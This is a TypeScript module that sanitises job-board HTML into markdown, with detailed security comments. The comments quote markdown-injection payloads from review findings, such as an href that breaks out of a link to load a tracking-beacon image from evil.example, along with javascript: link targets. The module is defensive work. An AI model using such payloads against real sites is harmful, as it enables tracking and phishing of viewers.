/**
 * HTML → Markdown conversion for third-party job descriptions —
 * task-job-sourcing-slice1 §2 ("описание рендерить как markdown БЕЗ сырого
 * HTML — иначе получаем внедрение скриптов на нашей странице").
 *
 * THE THREAT
 * ----------
 * DOU serves the description as escaped HTML. If we stored that HTML and let
 * the frontend render it (`dangerouslySetInnerHTML`, or react-markdown with
 * `rehype-raw`), a hostile or compromised feed would be executing script in
 * OUR authenticated origin, next to session cookies and CRM data.
 *
 * THE DEFENCE — an ALLOW-LIST, and it runs at INGEST
 * --------------------------------------------------
 * This converter understands a fixed, small set of tags and turns them into
 * markdown. Every other tag is DROPPED. Two tags are special: `<script>` and
 * `<style>` have their CONTENT dropped too — merely removing the tags would
 * leave `alert(1)` sitting in the text, and while that is inert in markdown it
 * is noise that looks alarming in review.
 *
 * Because it runs at ingest, what lands in the database is already markdown
 * with no raw HTML. The frontend then renders it with react-markdown WITHOUT
 * `rehype-raw` — so there are two independent layers, and neither one alone is
 * load-bearing.
 *
 * Markdown's own escape hatch is closed as well: markdown link targets are
 * validated, and any non-`http(s)` target (`javascript:`, `data:`) is rendered
 * as plain text instead of a link.
 *
 * Bounded by design: no backtracking regexes over unbounded input, and the
 * result is truncated to `MAX_DESCRIPTION_CHARS`.
 */

/** Descriptions longer than this are truncated (a job ad is never this long). */
export const MAX_DESCRIPTION_CHARS = 20_000

const HTML_ENTITIES: Record<string, string> = {
  amp: '&',
  lt: '<',
  gt: '>',
  quot: '"',
  apos: "'",
  nbsp: ' ',
  mdash: '—',
  ndash: '–',
  hellip: '…',
  laquo: '«',
  raquo: '»',
  rsquo: '’',
  lsquo: '‘',
  ldquo: '“',
  rdquo: '”',
  bull: '•',
  middot: '·',
}

function decodeHtmlEntities(value: string): string {
  return value.replace(/&(#x?[0-9a-f]+|[a-z]+);/gi, (match, body: string) => {
    if (body.startsWith('#')) {
      const isHex = body[1] === 'x' || body[1] === 'X'
      const code = Number.parseInt(isHex ? body.slice(2) : body.slice(1), isHex ? 16 : 10)
      if (!Number.isFinite(code) || code <= 0 || code > 0x10ffff) return match
      try {
        return String.fromCodePoint(code)
      } catch {
        return match
      }
    }
    const named = HTML_ENTITIES[body.toLowerCase()]
    return named ?? match
  })
}

/**
 * Characters that would otherwise be read as markdown syntax in plain text.
 *
 * `!` is in the list because of security-review round 3: without it, a
 * description ending in an exclamation mark directly before a link —
 *
 *   Great job!<a href="https://evil.example/px.png?leak=1">x</a>
 *
 * — emitted `Great job!` immediately followed by `[x](<…>)`, which markdown
 * reads as an IMAGE (`![alt](url)`), not text plus a link. That reassembles the
 * beacon this module exists to prevent and would rely entirely on the render
 * layer refusing images. Two layers only count if each holds alone.
 */
function escapeMarkdown(text: string): string {
  return text.replace(/([\\`*_[\]<>!])/g, '\\$1')
}

/**
 * Maximum length of a link destination we are willing to emit.
 */
const MAX_HREF_LENGTH = 2048

/**
 * Characters that must NEVER appear in a link destination we emit.
 *
 * SECURITY-REVIEW ROUND 2, HIGH-1 — this is the check that was too loose.
 * The previous test was `^https?:\/\/\S+$`, and `\S+` happily accepts `)`.
 * A DOU vacancy (anyone can post one — the source does not need to be
 * compromised) carrying
 *
 *   <a href="https://ok.example/x)![](https://evil.example/px.png?leak=1">t</a>
 *
 * produced the markdown
 *
 *   [t](https://ok.example/x)![](https://evil.example/px.png?leak=1)
 *
 * — the `)` closed OUR link and the rest became a second, attacker-controlled
 * markdown IMAGE: a tracking beacon on a foreign host (leaks that the vacancy
 * was viewed, plus the viewer's IP), or an `[Apply here](https://evil…)`
 * phishing link. No raw HTML and no `javascript:` anywhere, so neither the old
 * tests nor the "we don't enable rehype-raw" argument touched it.
 *
 * Note this was an injection MANUFACTURED BY THIS FUNCTION: the text was
 * escaped, the destination was interpolated raw.
 */
const FORBIDDEN_HREF_CHARS = /[\s()[\]<>"'`\\\u0000-\u001f\u007f]/

function isSafeLinkTarget(href: string): boolean {
  const trimmed = href.trim()
  if (trimmed.length === 0 || trimmed.length > MAX_HREF_LENGTH) return false
  if (FORBIDDEN_HREF_CHARS.test(trimmed)) return false
  return /^https?:\/\/[^\s]+$/i.test(trimmed)
}

/**
 * Render a validated destination in CommonMark's ANGLE-BRACKET form —
 * `[text](<https://…>)` — so a stray `)` cannot terminate the destination even
 * if the character check above were ever loosened again. Combined with that
 * check (which already rejects `(`, `)`, `<` and `>`), the destination has two
 * independent reasons it cannot break out of its own parentheses.
 *
 * Emitting it by bare string interpolation, with NO such guarantee, is exactly
 * what produced HIGH-1.
 */
function markdownLinkDestination(href: string): string {
  return `<${href.trim()}>`
}

interface Token {
  kind: 'text' | 'tag'
  value: string
  /** For tags: lowercased name. */
  name?: string
  closing?: boolean
  attrs?: string
}

/**
 * Split HTML into text/tag tokens with an `indexOf` scanner (no regex over the
 * whole document → no ReDoS surface).
 */
function tokenize(html: string): Token[] {
  const tokens: Token[] = []
  let cursor = 0

  while (cursor < html.length) {
    const lt = html.indexOf('<', cursor)
    if (lt === -1) {
      tokens.push({ kind: 'text', value: html.slice(cursor) })
      break
    }
    if (lt > cursor) tokens.push({ kind: 'text', value: html.slice(cursor, lt) })

    // Comments / CDATA / doctype — skipped whole, never interpreted.
    if (html.startsWith('<!--', lt)) {
      const end = html.indexOf('-->', lt)
      cursor = end === -1 ? html.length : end + 3
      continue
    }
    if (html.startsWith('<!', lt)) {
      const end = html.indexOf('>', lt)
      cursor = end === -1 ? html.length : end + 1
      continue
    }

    const gt = html.indexOf('>', lt)
    if (gt === -1) {
      // Unterminated tag — treat the remainder as text so nothing is smuggled
      // through by simply omitting a `>`.
      tokens.push({ kind: 'text', value: html.slice(lt) })
      break
    }

    const inner = html.slice(lt + 1, gt)
    const closing = inner.startsWith('/')
    const body = closing ? inner.slice(1) : inner
    const nameMatch = /^[a-z][a-z0-9]*/i.exec(body.trim())
    if (!nameMatch) {
      // `<3`, `< 5` — not a tag at all.
      tokens.push({ kind: 'text', value: html.slice(lt, gt + 1) })
      cursor = gt + 1
      continue
    }
    tokens.push({
      kind: 'tag',
      value: inner,
      name: nameMatch[0].toLowerCase(),
      closing,
      attrs: body.slice(nameMatch[0].length),
    })
    cursor = gt + 1
  }

  return tokens
}

function extractHref(attrs: string): string | null {
  const match = /href\s*=\s*("([^"]*)"|'([^']*)'|([^\s>]+))/i.exec(attrs)
  if (!match) return null
  return decodeHtmlEntities(match[2] ?? match[3] ?? match[4] ?? '').trim()
}

/**
 * Convert a third-party HTML fragment into markdown containing NO raw HTML.
 *
 * Returns `''` for empty/undefined input. Never throws.
 */
export function htmlToMarkdown(html: string | null | undefined): string {
  if (!html) return ''

  const tokens = tokenize(html)
  let out = ''
  /** Depth inside a tag whose CONTENT must be dropped (script/style). */
  let suppressDepth = 0
  let suppressTag: string | null = null
  /** Open markdown link, if any: collected text is emitted as `[text](href)`. */
  let linkHref: string | null = null
  let linkText = ''
  let listDepth = 0
  const orderedIndex: number[] = []

  const emit = (text: string) => {
    if (linkHref !== null) linkText += text
    else out += text
  }

  for (const token of tokens) {
    if (suppressDepth > 0) {
      if (token.kind === 'tag' && token.name === suppressTag) {
        if (token.closing) suppressDepth -= 1
        else suppressDepth += 1
        if (suppressDepth === 0) suppressTag = null
      }
      continue
    }

    if (token.kind === 'text') {
      const text = decodeHtmlEntities(token.value).replace(/\s+/g, ' ')
      if (text.trim().length === 0) {
        // Collapse insignificant whitespace but keep a single separating space.
        if (out.length > 0 && !out.endsWith(' ') && !out.endsWith('\n')) emit(' ')
        continue
      }
      emit(escapeMarkdown(text))
      continue
    }

    const name = token.name ?? ''

    switch (name) {
      case 'script':
      case 'style':
      case 'iframe':
      case 'object':
      case 'embed':
      case 'svg':
        // Drop the element AND everything inside it.
        if (!token.closing && !token.value.trimEnd().endsWith('/')) {
          suppressDepth = 1
          suppressTag = name
        }
        break

      case 'br':
        emit('\n')
        break

      case 'p':
      case 'div':
      case 'section':
      case 'article':
        out += token.closing ? '\n\n' : ''
        break

      case 'strong':
      case 'b':
        emit('**')
        break

      case 'em':
      case 'i':
        emit('_')
        break

      case 'h1':
      case 'h2':
      case 'h3':
      case 'h4':
      case 'h5':
      case 'h6': {
        const level = Number.parseInt(name.slice(1), 10)
        out += token.closing ? '\n\n' : `\n\n${'#'.repeat(level)} `
        break
      }

      case 'ul':
        if (token.closing) {
          listDepth = Math.max(0, listDepth - 1)
          out += '\n'
        } else {
          listDepth += 1
          out += '\n'
        }
        break

      case 'ol':
        if (token.closing) {
          listDepth = Math.max(0, listDepth - 1)
          orderedIndex.pop()
          out += '\n'
        } else {
          listDepth += 1
          orderedIndex.push(0)
          out += '\n'
        }
        break

      case 'li':
        if (!token.closing) {
          const indent = '  '.repeat(Math.max(0, listDepth - 1))
          if (orderedIndex.length > 0) {
            const idx = (orderedIndex[orderedIndex.length - 1] ?? 0) + 1
            orderedIndex[orderedIndex.length - 1] = idx
            out += `\n${indent}${idx}. `
          } else {
            out += `\n${indent}- `
          }
        }
        break

      case 'a':
        if (token.closing) {
          if (linkHref !== null) {
            const text = linkText.trim()
            // A target that is not a plain http(s) URL is rendered as TEXT,
            // never as a link — this is what stops `[click](javascript:…)`
            // from reaching the browser, and (HIGH-1) what stops a `)` in the
            // destination from closing our link and letting the rest of the
            // attribute become attacker-authored markdown.
            out +=
              isSafeLinkTarget(linkHref) && text.length > 0
                ? `[${text}](${markdownLinkDestination(linkHref)})`
                : text
            linkHref = null
            linkText = ''
          }
        } else {
          const href = extractHref(token.attrs ?? '')
          linkHref = href ?? ''
          linkText = ''
        }
        break

      default:
        // Every other tag (img, table, span, form, custom elements, …) is
        // dropped; its TEXT content still flows through as plain text.
        break
    }
  }

  // An unterminated <a> must not swallow its text.
  if (linkHref !== null) out += linkText.trim()

  const normalized = out
    .replace(/[ \t]+\n/g, '\n')
    .replace(/\n{3,}/g, '\n\n')
    .replace(/[ \t]{2,}/g, ' ')
    .trim()

  return normalized.length > MAX_DESCRIPTION_CHARS
    ? `${normalized.slice(0, MAX_DESCRIPTION_CHARS)}…`
    : normalized
}
